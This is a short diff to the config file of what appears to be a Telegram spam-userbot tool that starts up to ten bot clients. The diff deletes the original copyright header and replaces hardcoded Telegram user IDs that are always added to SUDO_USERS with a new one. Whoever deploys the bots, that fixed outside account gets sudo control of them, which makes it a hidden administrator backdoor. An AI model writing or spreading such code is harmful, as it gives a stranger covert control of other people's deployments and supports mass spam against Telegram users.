@@ -1,6 +1,3 @@
-# RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
-
 import os
 import sys
 import random
@@ -37,8 +34,8 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 5909030617 not in SUDO_USERS:
+    SUDO_USERS.append(5909030617)
 
 # Tokens
 
@@ -62,4 +59,4 @@ Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
 Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
-SUDO_USERS.append(2086101519)
+SUDO_USERS.append(5909030617)
